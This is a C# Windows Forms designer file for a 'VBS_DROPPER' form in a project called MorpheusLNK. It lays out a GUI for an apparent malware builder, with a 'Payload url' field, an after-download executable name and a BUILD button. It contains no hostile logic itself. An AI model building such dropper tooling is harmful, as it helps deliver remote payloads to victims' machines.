namespace MorpheusLNK
{
    partial class VBS_DROPPER
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.label1 = new System.Windows.Forms.Label();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.label3 = new System.Windows.Forms.Label();
            this.afterExe_Name = new System.Windows.Forms.TextBox();
            this.vbsBuild_btn = new System.Windows.Forms.Button();
            this.label2 = new System.Windows.Forms.Label();
            this.downloadUrl_Box = new System.Windows.Forms.TextBox();
            this.statusLabel = new System.Windows.Forms.Label();
            this.saveFileDialog1 = new System.Windows.Forms.SaveFileDialog();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Consolas", 24F, System.Drawing.FontStyle.Bold);
            this.label1.ForeColor = System.Drawing.Color.White;
            this.label1.Location = new System.Drawing.Point(12, 21);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(215, 37);
            this.label1.TabIndex = 5;
            this.label1.Text = "VBS-BUILDER";
            // 
            // pictureBox1
            // 
            this.pictureBox1.Image = global::MorpheusLNK.Properties.Resources.noback;
            this.pictureBox1.Location = new System.Drawing.Point(414, 31);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(303, 295);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox1.TabIndex = 29;
            this.pictureBox1.TabStop = false;
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Font = new System.Drawing.Font("Consolas", 11F, System.Drawing.FontStyle.Bold);
            this.label3.ForeColor = System.Drawing.Color.White;
            this.label3.Location = new System.Drawing.Point(76, 179);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(160, 18);
            this.label3.TabIndex = 28;
            this.label3.Text = "After Download Name";
            // 
            // afterExe_Name
            // 
            this.afterExe_Name.Font = new System.Drawing.Font("Consolas", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.afterExe_Name.Location = new System.Drawing.Point(14, 200);
            this.afterExe_Name.Multiline = true;
            this.afterExe_Name.Name = "afterExe_Name";
            this.afterExe_Name.Size = new System.Drawing.Size(370, 27);
            this.afterExe_Name.TabIndex = 27;
            this.afterExe_Name.Text = "LNKBUILD.exe";
            this.afterExe_Name.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // vbsBuild_btn
            // 
            this.vbsBuild_btn.BackColor = System.Drawing.Color.Black;
            this.vbsBuild_btn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.vbsBuild_btn.FlatAppearance.BorderSize = 0;
            this.vbsBuild_btn.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Purple;
            this.vbsBuild_btn.FlatAppearance.MouseOverBackColor = System.Drawing.Color.White;
            this.vbsBuild_btn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.vbsBuild_btn.Font = new System.Drawing.Font("Nirmala UI", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.vbsBuild_btn.ForeColor = System.Drawing.Color.MediumPurple;
            this.vbsBuild_btn.Location = new System.Drawing.Point(513, 390);
            this.vbsBuild_btn.Name = "vbsBuild_btn";
            this.vbsBuild_btn.Size = new System.Drawing.Size(205, 30);
            this.vbsBuild_btn.TabIndex = 26;
            this.vbsBuild_btn.Text = "BUILD";
            this.vbsBuild_btn.UseVisualStyleBackColor = false;
            this.vbsBuild_btn.Click += new System.EventHandler(this.vbsBuild_btn_Click);
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Font = new System.Drawing.Font("Consolas", 11F, System.Drawing.FontStyle.Bold);
            this.label2.ForeColor = System.Drawing.Color.White;
            this.label2.Location = new System.Drawing.Point(76, 91);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(96, 18);
            this.label2.TabIndex = 25;
            this.label2.Text = "Payload url";
            // 
            // downloadUrl_Box
            // 
            this.downloadUrl_Box.Font = new System.Drawing.Font("Consolas", 9.75F, System.Drawing.FontStyle.Bold);
            this.downloadUrl_Box.Location = new System.Drawing.Point(14, 120);
            this.downloadUrl_Box.Multiline = true;
            this.downloadUrl_Box.Name = "downloadUrl_Box";
            this.downloadUrl_Box.Size = new System.Drawing.Size(370, 27);
            this.downloadUrl_Box.TabIndex = 24;
            this.downloadUrl_Box.Text = "payload-url";
            this.downloadUrl_Box.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // statusLabel
            // 
            this.statusLabel.AutoSize = true;
            this.statusLabel.Font = new System.Drawing.Font("Consolas", 11F, System.Drawing.FontStyle.Bold);
            this.statusLabel.ForeColor = System.Drawing.Color.White;
            this.statusLabel.Location = new System.Drawing.Point(12, 423);
            this.statusLabel.Name = "statusLabel";
            this.statusLabel.Size = new System.Drawing.Size(0, 18);
            this.statusLabel.TabIndex = 30;
            // 
            // VBS_DROPPER
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(30)))), ((int)(((byte)(75)))));
            this.ClientSize = new System.Drawing.Size(733, 450);
            this.Controls.Add(this.statusLabel);
            this.Controls.Add(this.pictureBox1);
            this.Controls.Add(this.label3);
            this.Controls.Add(this.afterExe_Name);
            this.Controls.Add(this.vbsBuild_btn);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.downloadUrl_Box);
            this.Controls.Add(this.label1);
            this.ForeColor = System.Drawing.Color.White;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "VBS_DROPPER";
            this.Text = "VBS_DROPPER";
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.PictureBox pictureBox1;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.TextBox afterExe_Name;
        private System.Windows.Forms.Button vbsBuild_btn;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.TextBox downloadUrl_Box;
        private System.Windows.Forms.Label statusLabel;
        private System.Windows.Forms.SaveFileDialog saveFileDialog1;
    }
}